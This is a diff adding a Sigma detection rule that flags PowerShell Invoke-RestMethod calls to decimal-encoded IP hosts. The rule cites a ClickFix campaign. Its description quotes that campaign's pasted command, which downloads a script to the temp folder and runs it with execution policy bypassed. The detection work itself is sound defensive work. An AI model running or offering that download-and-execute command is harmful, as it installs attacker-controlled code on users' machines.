@@ -1,0 +1,30 @@
+title: PowerShell Invoke-RestMethod To Decimal-Encoded IP Host
+id: 76bcdcf4-a8aa-4e4b-9d23-51c30e7528ba
+status: experimental
+description: |
+    Detects a command line in which PowerShell's Invoke-RestMethod (alias irm) targets a host written as a single decimal integer instead of a dotted IPv4 address
+    (8 to 10 digits, the range of a decimal-encoded IPv4 address), e.g. "irm 1614733393/12".
+    Huntress reports an unattributed ClickFix campaign in which the pasted command was
+    PowerShell.exe -ExecutionPolicy Bypass "irm 1614733393/12 | Out-File $env:temp\1777.ps1;& $env:temp\1777.ps1", noting that the host is written as a decimal number rather than a dotted IP.
+    SigmaHQ "Obfuscated IP Download Activity" matches the reported sample only via its octal clause, because the leading digits happen to be 0-7; it does not match decimal hosts generally.
+    SigmaHQ "Suspicious Invoke-WebRequest Execution With DirectIP" requires '://' in the command line.
+references:
+    - https://www.huntress.com/blog/chatgpt-custom-gpts-clickfix-rat
+author: Esmond Er
+date: 2026-10-01
+modified: 2026-10-01
+tags:
+    - attack.command-and-control
+    - attack.t1105
+    - attack.execution
+    - attack.t1059.001
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|re|i: '\b(irm|Invoke-RestMethod)\s+(https?://)?[0-9]{8,10}([/:\s"'']|$)'
+    condition: selection
+falsepositives:
+    - Scripts that pass an 8 to 10 digit number as the first positional argument of Invoke-RestMethod (unusual, since that argument is the URI)
+level: high
